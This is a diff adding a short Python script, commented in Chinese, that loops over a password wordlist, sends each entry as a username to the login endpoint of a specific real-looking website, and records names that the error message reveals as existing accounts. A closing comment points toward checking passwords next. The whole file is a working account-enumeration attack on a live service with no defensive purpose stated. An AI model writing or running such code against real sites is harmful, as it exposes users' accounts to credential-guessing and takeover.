@@ -1,0 +1,32 @@
+import requests
+import json
+import time
+#读取密码字典
+
+with open('password1000w.txt','r') as f:
+    list = f.readlines()
+    for i in range(0,len(list)):
+        list[i]=list[i].strip('\n')
+zhanghao=[]
+for i in range(0,len(list)):
+    print(list[i])
+    url_params={'userName':list[i]}
+    r=requests.get('https://m.yymh8801.com/user/login?',params=url_params)
+    rtValue = r.text
+    print(rtValue)
+    jValue = json.loads(r.text)
+    if(jValue['msg']=='登錄失敗：密碼不能為空'):
+        zhanghao.append(list[i])
+with open('zhanghao.txt','w+') as f:
+    f.writelines(zhanghao)
+#转换成json格式
+#json.loads and eval str转json
+#json.dumps json 转 str
+
+#判断密码是否正确
+
+
+
+
+
+
